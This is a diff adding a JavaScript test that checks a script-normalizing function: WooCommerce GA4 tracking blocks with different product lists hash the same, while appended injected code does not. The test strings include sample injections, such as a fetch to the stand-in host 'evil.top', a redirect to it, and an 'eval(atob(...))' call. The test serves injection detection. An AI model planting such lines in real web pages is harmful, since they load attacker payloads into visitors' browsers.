@@ -193,3 +193,12 @@ test('pure data blocks compare by what they assign, not by their (product-specif
   assert.notEqual(normalizeScript(a), normalizeScript('window.location = "https://evil.top/";'));
   assert.notEqual(normalizeScript(a), normalizeScript('window.ga4w = {}; fetch("https://evil.top/x")'));
 });
+
+test('WooCommerce GA4 block with a different related-products list hashes the same; injected code does not', () => {
+  const ga4 = (products) => `window.ga4w = { data: {"cart":{"items":[],"totals":{"currency_code":"EGP","total_price":0}},"product":{"id":32755,"name":"Diamond Ring Band","categories":[{"name":"Diamond Rings"},{"name":"Bridal Jewelry"}],"prices":{"price":66800}},"products":[${products}],"events":["view_item_list","view_item"]}, settings: {"tracker_function_name":"gtag","events":["purchase"],"currency":{"precision":0}} }; document.dispatchEvent(new Event("ga4w:ready"));`;
+  const p1 = '{"id":30133,"name":"Two-Tone Ring","categories":[{"name":"Diamond Rings"},{"name":"Uncategorized"}]},{"id":28951,"name":"Twist Ring","categories":[{"name":"A"},{"name":"B"},{"name":"C"}]}';
+  const p2 = '{"id":15151,"name":"Cushion Halo","categories":[{"name":"Diamond Jewelry"}]}';
+  assert.equal(normalizeScript(ga4(p1)), normalizeScript(ga4(p2)));
+  assert.notEqual(normalizeScript(ga4(p1)), normalizeScript(ga4(p1) + 'fetch("https://evil.top/k").then(function(r){return r.text()});'));
+  assert.notEqual(normalizeScript('var a = {x:1}; run(a);'), normalizeScript('var a = {x:1}; run(a); eval(atob(a.x));'));
+});
